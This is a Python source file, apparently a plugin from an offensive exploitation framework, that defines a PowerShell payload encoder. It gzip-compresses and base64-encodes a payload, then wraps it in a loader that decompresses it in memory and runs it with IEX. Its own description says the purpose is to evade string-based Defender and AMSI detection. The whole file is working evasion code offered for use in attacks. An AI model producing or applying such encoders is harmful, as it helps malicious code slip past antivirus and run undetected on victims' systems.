"""PowerShell GZip+base64 compression encoder."""

import base64
import gzip
from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures


class Encoder(BaseEncoder):
    __info__ = {
        "name": "PowerShell GZip+Base64 Encoder",
        "description": "GZip compress + base64 — evades string-based Defender/AMSI detection.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "evasion_score": 6,
    }

    architecture = None

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        ps_payload = payload.decode(errors="replace")
        compressed = gzip.compress(ps_payload.encode("utf-16-le"))
        b64 = base64.b64encode(compressed).decode()
        loader = (
            f'$data=[Convert]::FromBase64String("{b64}");'
            '$ms=New-Object IO.MemoryStream(,$data);'
            '$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);'
            '$sr=New-Object IO.StreamReader($gs,[Text.Encoding]::Unicode);'
            'IEX $sr.ReadToEnd()'
        )
        return loader.encode()
